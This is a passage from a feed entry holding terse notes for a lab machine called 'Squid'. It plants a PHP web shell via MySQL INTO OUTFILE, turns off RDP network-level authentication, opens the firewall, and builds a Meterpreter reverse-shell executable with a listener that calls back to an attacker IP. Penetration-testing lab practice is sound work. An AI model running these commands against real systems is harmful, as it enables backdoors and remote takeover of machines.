+&lt;h4&gt;Mysql 3306:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;into&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;outfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;C:\\xampp\\htdocs\\backdoor.php&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Disable NLA;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v …&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h1&gt;SQUID - MACHINE / PG&lt;/h1&gt;
+&lt;h1&gt;PG/easy_windows&lt;/h1&gt;
+&lt;p&gt;This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128&lt;/p&gt;
+&lt;h4&gt;Mysql 3306:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;into&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;outfile&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;C:\\xampp\\htdocs\\backdoor.php&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Disable NLA;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v&lt;span class="w"&gt; &lt;/span&gt;UserAuthentication&lt;span class="w"&gt; &lt;/span&gt;/t&lt;span class="w"&gt; &lt;/span&gt;REG_DWORD&lt;span class="w"&gt; &lt;/span&gt;/d&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Enable RDP on owned machine:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;reg&lt;span class="w"&gt; &lt;/span&gt;add&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/v&lt;span class="w"&gt; &lt;/span&gt;fDenyTSConnections&lt;span class="w"&gt; &lt;/span&gt;/t&lt;span class="w"&gt; &lt;/span&gt;REG_DWORD&lt;span class="w"&gt; &lt;/span&gt;/d&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;netsh&lt;span class="w"&gt; &lt;/span&gt;advfirewall&lt;span class="w"&gt; &lt;/span&gt;firewall&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;rule&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;group&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;remote desktop&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;new&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;enable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h4&gt;Reverse Shell with Meterpreter:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom&lt;span class="w"&gt; &lt;/span&gt;-p&lt;span class="w"&gt; &lt;/span&gt;windows/meterpreter/reverse_tcp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.0.17&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;--format&lt;span class="o"&gt;=&lt;/span&gt;exe&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;evil.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;use&lt;span class="w"&gt; &lt;/span&gt;exploit/multi/handler
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;payload&lt;span class="w"&gt; &lt;/span&gt;windows/meterpreter/reverse_tcp
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;LHOST&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.168.0.17
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;LPORT&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;4444&lt;/span&gt;
+msf5&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;run
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="HTB"></category></entry></feed>
